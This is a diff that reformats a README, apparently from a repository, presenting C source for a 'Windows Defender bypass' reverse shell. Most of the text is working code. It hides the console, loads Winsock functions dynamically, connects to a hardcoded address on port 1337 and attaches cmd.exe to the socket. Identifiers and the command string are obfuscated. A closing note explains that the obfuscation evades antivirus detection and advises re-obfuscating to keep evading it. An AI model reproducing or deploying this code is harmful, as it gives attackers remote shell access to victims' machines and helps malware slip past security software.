@@ -1,14 +1,20 @@
-WINDOWS DEFENDER Bypass malware
-This program demonstrates how to establish a remote connection to a server using the WinSock2 library and execute a command prompt (cmd.exe) on a Windows system. The code dynamically loads functions from ws2_32.dll and uses these functions to perform network operations.
+# WINDOWS DEFENDER Bypass Malware
 
-Prerequisites
-A Windows environment.
-Visual Studio or any other C/C++ compiler for Windows.
-ws2_32.dll should be present on the system (it's a standard DLL provided by Windows).
-Detailed Description
-Code Breakdown
-Include Headers and Library
-```
+This program demonstrates how to establish a remote connection to a server using the WinSock2 library and execute a command prompt (`cmd.exe`) on a Windows system. The code dynamically loads functions from `ws2_32.dll` and uses these functions to perform network operations.
+
+## Prerequisites
+
+- A Windows environment.
+- Visual Studio or any other C/C++ compiler for Windows.
+- `ws2_32.dll` should be present on the system (it's a standard DLL provided by Windows).
+
+## Detailed Description
+
+### Code Breakdown
+
+#### Include Headers and Library
+
+```c
 #include <stdio.h>
 #include <windows.h>
 #include <WinSock2.h>
@@ -16,22 +22,19 @@ Include Headers and Library
 #include <stdlib.h>
 
 #pragma comment(lib, "user32.lib")
-```
 These headers provide the necessary functions and definitions for Windows API, network operations, and standard I/O operations.
 
-Typedef Function Pointers
-```
+#### Typedef Function Pointers
+
 typedef int (WSAAPI *lpfnWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
 typedef int (WSAAPI *lpfnWSACleanup)(void);
 typedef SOCKET (WSAAPI *lpfnWSASocket)(int af, int type, int protocol, LPWSAPROTOCOL_INFO lpProtocolInfo, GROUP g, DWORD dwFlags);
 typedef int (WSAAPI *lpfnWSAConnect)(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);
 typedef int (WSAAPI *lpfnRecv)(SOCKET s, char *buf, int len, int flags);
-```
 
 These typedefs declare pointers to the functions we will dynamically load from ws2_32.dll.
 
-Main Function
-```
+#### Main Function
 int main(int argc, char* argv[]) {
     FreeConsole();  // Hide the console window
 
@@ -40,10 +43,8 @@ int main(int argc, char* argv[]) {
         printf("Could not load ws2_32.dll\n");
         return 1;
     }
-```
-Get Function Addresses
-```
-lpfnWSAStartup uywueftuwefwuuw = (lpfnWSAStartup)GetProcAddress(hwww, "WSAStartup");
+#### Get Function Address
+    lpfnWSAStartup uywueftuwefwuuw = (lpfnWSAStartup)GetProcAddress(hwww, "WSAStartup");
     lpfnWSACleanup ploskdmcnc = (lpfnWSACleanup)GetProcAddress(hwww, "WSACleanup");
     lpfnWSASocket yncsj = (lpfnWSASocket)GetProcAddress(hwww, "WSASocketW");
     lpfnWSAConnect llllosksuua = (lpfnWSAConnect)GetProcAddress(hwww, "WSAConnect");
@@ -53,33 +54,28 @@ lpfnWSAStartup uywueftuwefwuuw = (lpfnWSAStartup)GetProcAddress(hwww, "WSAStartu
         printf("Could not get function addresses\n");
         FreeLibrary(hwww);
         return 1;
-```
-Initialize WinSock and Create a Socket
- WSADATA ietuwecwtuecwucuwaa;
+    }
+#### Initialize WinSock and Create a Socket
+WSADATA ietuwecwtuecwucuwaa;
     uywueftuwefwuuw(MAKEWORD(2, 2), &ietuwecwtuecwucuwaa);  // Initialize WinSock
     SOCKET qqweretrwqcqqmmn = yncsj(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);  // Create a TCP socket
 
-Configure Server Address
-```
-struct sockaddr_in Inksjshsfww;
+#### Configure Server Address
+    struct sockaddr_in Inksjshsfww;
     Inksjshsfww.sin_port = htons(1337);  // Port number
     Inksjshsfww.sin_family = AF_INET;
     Inksjshsfww.sin_addr.s_addr = inet_addr("192.168.1.1");  // Server IP address
-```
-Connect to Server
-```
-int lthnbvmdl = llllosksuua(qqweretrwqcqqmmn, (SOCKADDR*)&Inksjshsfww, sizeof(Inksjshsfww), NULL, NULL, NULL, NULL);
+
+#### Connect to Server
+    int lthnbvmdl = llllosksuua(qqweretrwqcqqmmn, (SOCKADDR*)&Inksjshsfww, sizeof(Inksjshsfww), NULL, NULL, NULL, NULL);
     if (lthnbvmdl == SOCKET_ERROR) {
         printf("Connection Error to the server: %lu\n", WSAGetLastError());
         ploskdmcnc();
         FreeLibrary(hwww);
         return 1;
     }
-```
-Receive Data and Setup STARTUPINFO
-
-```
- char awqszxa[4096];
+#### Receive Data and STARTUPINFO
+    char awqszxa[4096];
     ujvjcmvcmvcmmcjyhn(qqweretrwqcqqmmn, awqszxa, sizeof(awqszxa), 0);  // Receive data
 
     STARTUPINFO siosusg;
@@ -89,11 +85,9 @@ Receive Data and Setup STARTUPINFO
     siosusg.cb = sizeof(siosusg);
     siosusg.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     siosusg.hStdInput = siosusg.hStdOutput = siosusg.hStdError = (HANDLE)qqweretrwqcqqmmn;
-```
-Construct Command String and Create Process
 
-```
- char b[3] = "cm";
+#### Construct Command String and Create Process
+    char b[3] = "cm";
     char c[4] = "d.e";
     char d[2] = "x";
     char e[2] = "e";
@@ -115,18 +109,15 @@ Construct Command String and Create Process
 
     CloseHandle(iloksj.hThread);
     CloseHandle(iloksj.hProcess);
-```
-Cleanup and Exit
- memset(awqszxa, 0, sizeof(awqszxa));
-   ploskdmcnc();
-   FreeLibrary(hwww);
-   return 0;
-}
 
+#### Cleanup and Exit
+    memset(awqszxa, 0, sizeof(awqszxa));
+    ploskdmcnc();
+    FreeLibrary(hwww);
+    return 0;
+}
 Obfuscation Note
 The variable names and certain parts of the code are obfuscated to evade static analysis detection by Windows Defender. If you want to bypass detection again, please change the file signature and obfuscate the code in different ways, as Windows Defender can capture static patterns.
 
 Summary
 This program demonstrates how to dynamically load network-related functions from ws2_32.dll, create a TCP socket, connect to a remote server, and execute a command prompt using the Windows API. It is an example of low-level network programming and process management in C on a Windows platform. Use this knowledge responsibly and ethically.
-
-        
